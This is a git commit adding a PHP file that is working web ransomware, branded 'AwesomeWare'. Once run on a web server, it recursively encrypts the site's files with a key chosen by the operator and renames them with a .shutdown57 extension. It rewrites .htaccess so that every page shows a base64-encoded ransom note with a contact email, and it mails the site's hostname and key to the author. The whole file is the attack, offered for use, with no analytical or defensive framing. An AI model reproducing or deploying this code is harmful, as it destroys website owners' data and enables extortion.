3cce9bb8d39495675fb34afcb5be2ade94608ca2
Rmdn19id <40439759+Rmdn19id@users.noreply.github.com>
2019-06-26 22:12:55 +0700

    Create w.php

---
+++ w.php
@@ -0,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Hi ! Mr.Rm19 :* - AwesomeWare</title>
+<style type="text/css">
+body {
+    background: #1A1C1F;
+    color: #e2e2e2;
+}
+.inpute{
+    border-style: dotted;
+    border-color: #379600;
+    background-color: transparent;
+    color: white;
+    text-align: center;
+}
+.selecte{
+    border-style: dotted;
+    border-color: green;
+    background-color: transparent;
+    color: green;
+}
+.submite{
+       border-style: dotted;
+    border-color: #4CAF50;
+    background-color: transparent;
+    color: white;
+}
+.result{
+  text-align: left;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+</head>
+<body>
+<div class="result">
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+class deRanSomeware
+{
+   public function shcpackInstall(){
+    if(!file_exists(".htashutdown57")){
+      rename(".htaccess", ".htashutdown57");
+      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team - ReC0ded by : Mr.Rm19 - Original by : shor7cut \r\nDirectoryIndex Mr.Rm19.php\r\nErrorDocument 404 /Mr.Rm19.php")){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+      }
+      if(file_put_contents("Mr.Rm19.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgPHRpdGxlPkhpICEgTXIuUm0xOSA6KjwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewogICAgYmFja2dyb3VuZDogIzFBMUMxRjsKICAgIGNvbG9yOiAjZTJlMmUyOwp9CmF7CiAgIGNvbG9yOnJlZDsKICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9CmE6aG92ZXJ7CiAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT48Zm9udCBjb2xvcj1yZWQ+CiAgX19fX19fX19fX19fX19fICAgICAgICAgIHwqXF8vKnxfX19fX19fXwogfCAgX19fX19fX19fX18gIHwgICAgICAgIHx8Xy8tXF98X19fX19fICB8CiB8IHwgICA+ICAgPCAgIHwgfCAgICAgICAgfCB8ICAgMCAgIDwgICB8IHwKIHwgfCAgICAgLSAgICAgfCB8ICAgICAgICB8IHwgICAgIC0gICAgIHwgfAogfCB8ICAgXF9fXy8gICB8IHwgICAgICAgIHwgfCAgIFxfX18vICAgfCB8CiB8X19fX198XF8vfF9fX19ffCAgICAgICAgfF9fX19fX19fX19fX19fX3w8L2ZvbnQ+CiAgLyAqKioqKioqKioqIFwuLi4uLi4uLi4uLiAvICoqKioqKioqKiogXAovICAqKioqKioqKioqKiogIFwgICAgICAgIC8gICoqKioqKioqKioqKiAgXAotLS0tLS0tLS0tLS0tLS0tLS0tLSAgICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tClJBTlNPTUVXQVJFIE1yLlJtMTkgc2lyIDopIHNvcnJ5ICwgY2hhdCBteSBlbWFpbCA6KQorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCiAgIFsgPGEgaHJlZj0nbWFpbHRvOlJhbWRhbjE5aWRAZ21haWwuY29tJz5SYW1kYW4xOWlkQGdtYWlsLmNvbTwvYT4gXQorLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKwp8IFRoaXMgcGFnZSBoYXMgYmVlbiBMb2NrZWQgISBSZWFkIG1vcmUgYWJvdXQgPGEgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUmFuc29td2FyZSIgdGFyZ2V0PSJfYmxhbmsiPnJhbnNvbWV3YXJlPC9hPiB8CnwgSG93IHRvIHJlc3RvcmUgdGhlIGJlZ2lubmluZz8gICAgICAgfCsrKysrKysrKysrKysrKysrKyt8CnwgUGxlYXNlIGNvbnRhY3QgdXMgdmlhIGVtYWlsIGxpc3RlZCAgfCAgICAgTXIuUm0xOSAgICB8CistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCjwvcHJlPgo8L2NlbnRlcj4KPC9ib2R5Pgo8L2h0bWw+
+"))){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  Mr.Rm19.php (Default Page)<br>';
+      }
+    }
+   }
+   public function shcpackUnstall(){
+
+      if( file_exists(".htashutdown57") ){
+        if( unlink(".htaccess") && unlink("Mr.Rm19.php") ){
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> Mr.Rm19.php (Default Page)<br>';
+        }
+        rename(".htashutdown57", ".htaccess");
+      }
+
+   }
+
+   public function plus(){
+      flush();
+      ob_flush();
+   }
+   public function locate(){
+        return getcwd();
+    }
+   public function shcdirs($dir,$method,$key){
+        switch ($method) {
+          case '1':
+            deRanSomeware::shcpackInstall();
+          break;
+          case '2':
+           deRanSomeware::shcpackUnstall();
+          break;
+        }
+        foreach(scandir($dir) as $d)
+        {
+            if($d!='.' && $d!='..')
+            {
+                $locate = $dir.DIRECTORY_SEPARATOR.$d;
+                if(!is_dir($locate)){
+                   if(  deRanSomeware::kecuali($locate,"awesome1945.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"Mr.Rm19.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashutdown57") ){
+                     switch ($method) {
+                        case '1':
+                           deRanSomeware::shcEnCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"1");
+                        break;
+                        case '2':
+                           deRanSomeware::shcDeCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"2");
+                        break;
+                     }
+                   }
+                }else{
+                  deRanSomeware::shcdirs($locate,$method,$key);
+                }
+            }
+            deRanSomeware::plus();
+        }
+        deRanSomeware::report($key);
+   }
+
+   public function report($key){
+        $message.= "=========     Report Ransomware    =========\n";
+        $message.= "Website : ".$_SERVER['HTTP_HOST'];
+        $message.= "Key     : ".$key;
+        $message.= "========= Indonesian (2019) Ransomware =========\n";
+        $subject = "Report Ransomeware !";
+        $headers = "From: Ransomware <ramdan19id@gmail.com>\r\n";
+        mail("ramdan19id@gmail.com",$subject,$message,$headers);
+   }
+
+   public function shcEnDesDirS($locate,$method){
+      switch ($method) {
+        case '1':
+          rename($locate, $locate.".shutdown57");
+        break;
+        case '2':
+          $locates = str_replace(".shutdown57", "", $locate);
+          rename($locate, $locates);
+        break;
+      }
+   }
+
+   public function shcEnCry($key,$locate){
+      $data = file_get_contents($locate);
+      $iv = mcrypt_create_iv(
+          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
+          MCRYPT_DEV_URANDOM
+      );
+
+      $encrypted = base64_encode(
+          $iv .
+          mcrypt_encrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              $data,
+              MCRYPT_MODE_CBC,
+              $iv
+          )
+      );
+      if(file_put_contents($locate,  $encrypted )){
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
+      }
+   }
+
+   public function shcDeCry($key,$locate){
+      $data = base64_decode( file_get_contents($locate) );
+      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
+
+      $decrypted = rtrim(
+          mcrypt_decrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
+              MCRYPT_MODE_CBC,
+              $iv
+          ),
+          "\0"
+      );
+      if(file_put_contents($locate,  $decrypted )){
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }
+   }
+
+
+
+   public function kecuali($ext,$name){
+        $re = "/({$name})/";
+        preg_match($re, $ext, $matches);
+        if($matches[1]){
+            return false;
+        }
+            return true;
+     }
+}
+
+if($_POST['submit']){
+switch ($_POST['method']) {
+   case '1':
+      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
+   break;
+   case '2':
+     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+   break;
+}
+}else{
+?>
+<center>
+<h1>AwesomeWare - indonesianpeople </h1>
+<p>Ramdan19id@gmail.com</p>
+<form action="" method="post" style=" text-align: center;">
+      <label>Key : </label>
+      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
+      <select name="method" class="selecte">
+         <option value="1">Infection</option>
+         <option value="2">DeInfection</option>
+      </select>
+      <input type="submit" name="submit" class="submite" value="Submit" />
+</form>
+</center>
+<?php
+}?>
+</div>
+</body>
+</html>
+
+
+<?php
+
+?>
